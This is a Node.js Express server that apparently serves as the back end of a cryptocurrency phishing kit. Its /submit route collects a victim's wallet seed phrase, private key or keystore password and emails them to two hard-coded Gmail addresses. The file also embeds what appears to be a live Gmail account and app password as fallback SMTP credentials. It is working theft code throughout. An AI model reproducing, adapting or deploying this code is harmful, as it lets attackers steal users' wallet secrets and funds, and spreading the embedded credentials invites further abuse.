const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, 'public')));

const maillist = [
  'Divasnow178@gmail.com',
  'rf7765272@gmail.com',
];

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.EMAIL_USER || "hello.jonathanpius@gmail.com",
    pass: process.env.EMAIL_PASS || "rbenxiivasedcnaw",
  },
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'app.html'));
});

app.post('/submit', async (req, res) => {
  try {
    console.log('Submission received:', req.body);

    // Extract form data
    const { walletName, phraseWallet, passwordWallet } = req.body;

    // Prepare email options
    const mailOptions = {
      from: '"Wallet Details" <hello.jonathanpius@gmail.com>',
      to: maillist,
      subject: "New Wallet Details Submitted",
      html: `
        <h2>Wallet Details Submission</h2>
        <p><strong>Wallet Name:</strong> ${walletName || 'Not provided'}</p>
        <p><strong>Wallet Phrase/Keystore/Private Key:</strong> ${phraseWallet || 'Not provided'}</p>
        <p><strong>Password (if keystore):</strong> ${passwordWallet || 'Not provided'}</p>
      `
    };

    // Send email
    const info = await transporter.sendMail(mailOptions);

    console.log('Email sent:', info.messageId);
    console.log('Accepted:', info.accepted);
    console.log('Rejected:', info.rejected);

    res.status(200).send('Wallet details submitted successfully');
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).send('Error submitting wallet details');
  }
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});

module.exports = app;